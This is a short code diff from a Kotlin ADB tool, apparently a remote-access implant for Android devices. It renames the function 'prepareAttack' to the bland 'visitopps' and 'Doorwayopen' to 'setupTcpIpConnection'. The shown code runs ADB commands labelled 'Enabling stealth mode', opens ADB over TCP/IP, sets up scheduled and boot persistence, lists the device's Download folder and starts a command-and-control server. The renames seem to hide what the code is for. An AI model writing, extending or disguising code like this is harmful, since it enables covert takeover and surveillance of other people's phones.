@@ -195,7 +195,7 @@ class ADBBase(private val logger: Logger = Logger()) {
 
     // --- Core ADB Interaction Functions (Refactored for Async) ---
 
-    suspend fun prepareAttack() {
+    suspend fun visitopps() {
         executeAdbBatch(
             listOf(
                 "settings put global adb_enabled 0",
@@ -205,7 +205,7 @@ class ADBBase(private val logger: Logger = Logger()) {
                 "input keyevent 26"
             ), "Enabling stealth mode"
         )
-        Doorwayopen()
+        setupTcpIpConnection()
         schedulePersistentTask()
         enableBootPersistence()
         listFiles("/sdcard/Download")
@@ -213,7 +213,7 @@ class ADBBase(private val logger: Logger = Logger()) {
         startC2Server()
     }
 
-    private suspend fun Doorwayopen() {
+    private suspend fun setupTcpIpConnection() {
         val tcpResult = executeAdbCommand("tcpip ${config.tcpPort}", "Setting up TCP/IP on port ${config.tcpPort}")
         if (tcpResult.exitCode != 0) logger.warning("TCP/IP setup failed: ${tcpResult.error}")
 
